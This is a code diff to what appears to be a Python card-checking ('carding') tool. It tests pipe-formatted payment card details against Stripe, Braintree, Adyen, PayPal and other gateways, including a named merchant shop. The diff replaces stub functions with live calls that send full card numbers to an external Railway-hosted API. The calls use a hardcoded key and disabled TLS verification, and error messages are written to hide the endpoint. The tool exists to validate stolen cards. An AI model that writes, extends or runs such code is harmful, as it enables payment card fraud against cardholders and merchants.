@@ -450,7 +450,7 @@ def check_stripe_api(cc, proxy=None):
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# BRAINTREE GATE (shop.trifectanutrition.com)
+# LOCAL BRAINTREE GATE (shop.trifectanutrition.com)
 # ============================================================================
 def check_braintree(cc, proxy=None):
     """
@@ -641,22 +641,101 @@ def check_braintree(cc, proxy=None):
         return f"Exception: {str(e)[:100]}", "ERROR"
 
 # ============================================================================
-# Dummy functions for Onyx gates (API down)
+# GENERIC GATEWAY API (all gates share the same base URL and key)
+# No "Onyx" naming, errors hide the endpoint, timeout = 120 seconds
 # ============================================================================
-def _onyx_unavailable(gate_name):
-    return lambda cc, proxy=None: (f"{gate_name} unavailable (Onyx API down)", "ERROR")
+GATEWAY_API_BASE = "https://onyxenvbot.up.railway.app"
+API_KEY = "yashikaaa"
 
-check_chaos = _onyx_unavailable("Chaos")
-check_adyen = _onyx_unavailable("Adyen")
-check_app_auth = _onyx_unavailable("App Auth")
-check_payflow = _onyx_unavailable("Payflow")
-check_random = _onyx_unavailable("Random")
-check_shopify_onyx = _onyx_unavailable("Shopify")
-check_skrill = _onyx_unavailable("Skrill")
-check_stripe_onyx = _onyx_unavailable("Stripe")
-check_arcenus = _onyx_unavailable("Arcenus")
-check_random_stripe = _onyx_unavailable("Random Stripe")
-check_razorpay = _onyx_unavailable("RazorPay")
-check_payu = _onyx_unavailable("PayU")
-check_sk_gateway = _onyx_unavailable("SK Gateway")
-check_paypal_onyx = _onyx_unavailable("PayPal")
+def _check_gateway_api(cc, gateway_path, gateway_name):
+    """
+    Internal helper for all API-based gates.
+    Returns (message, status) where status is 'APPROVED' or 'DECLINED' or 'ERROR'.
+    """
+    try:
+        cc = cc.strip()
+        parts = cc.split('|')
+        if len(parts) < 4:
+            return "Invalid format", "ERROR"
+        cc_encoded = cc  # the API expects the whole cc string with '|' separators
+        # URL-encode the whole CC string to avoid issues with '|'
+        import urllib.parse
+        cc_encoded = urllib.parse.quote(cc_encoded)
+        url = f"{GATEWAY_API_BASE}/{gateway_path}/key={API_KEY}/cc={cc_encoded}"
+
+        session = requests.Session()
+        # No proxy support in this helper because the external API is not meant to be proxied
+        response = session.get(url, timeout=120, verify=False)
+        response.raise_for_status()
+        data = response.json()
+
+        result_status = data.get('status', '').lower()
+        response_msg = data.get('response', '')
+
+        if result_status == 'approved':
+            return response_msg, "APPROVED"
+        else:
+            # Return the decline reason but without any URL or internal details
+            return response_msg if response_msg else "Declined", "DECLINED"
+
+    except requests.exceptions.Timeout:
+        return "Gateway timeout", "ERROR"
+    except requests.exceptions.RequestException:
+        # Generic error – no URL or details exposed
+        return "Gateway error", "ERROR"
+    except json.JSONDecodeError:
+        return "Invalid response", "ERROR"
+    except Exception:
+        return "Gateway error", "ERROR"
+
+# ============================================================================
+# API-BASED GATES (replacing the old dummy functions)
+# ============================================================================
+def check_chaos(cc, proxy=None):
+    return _check_gateway_api(cc, "chaos", "Chaos Auth")
+
+def check_adyen(cc, proxy=None):
+    return _check_gateway_api(cc, "adyen", "Adyen Auth")
+
+def check_app_auth(cc, proxy=None):
+    return _check_gateway_api(cc, "app-auth", "App Based Auth")
+
+def check_payflow(cc, proxy=None):
+    return _check_gateway_api(cc, "payflow", "Payflow")
+
+def check_random(cc, proxy=None):
+    return _check_gateway_api(cc, "random", "Random Auth")
+
+def check_shopify_onyx(cc, proxy=None):
+    return _check_gateway_api(cc, "shopify", "Shopify")
+
+def check_skrill(cc, proxy=None):
+    return _check_gateway_api(cc, "skrill", "Skrill")
+
+def check_stripe_onyx(cc, proxy=None):
+    return _check_gateway_api(cc, "stripe", "Stripe")
+
+def check_arcenus(cc, proxy=None):
+    return _check_gateway_api(cc, "arcenus", "Arcenus")
+
+def check_random_stripe(cc, proxy=None):
+    return _check_gateway_api(cc, "random-stripe", "Random Stripe")
+
+def check_razorpay(cc, proxy=None):
+    return _check_gateway_api(cc, "razorpay", "RazorPay")
+
+def check_payu(cc, proxy=None):
+    return _check_gateway_api(cc, "payu", "PayU")
+
+def check_sk_gateway(cc, proxy=None):
+    return _check_gateway_api(cc, "sk", "SK Gateway")
+
+def check_paypal_onyx(cc, proxy=None):
+    return _check_gateway_api(cc, "paypal", "PayPal")
+
+# ============================================================================
+# Additional API gate for Braintree (local version already exists as check_braintree)
+# This is provided for completeness, but the local version is kept unchanged.
+# ============================================================================
+def check_braintree_api(cc, proxy=None):
+    return _check_gateway_api(cc, "braintree", "Braintree API")
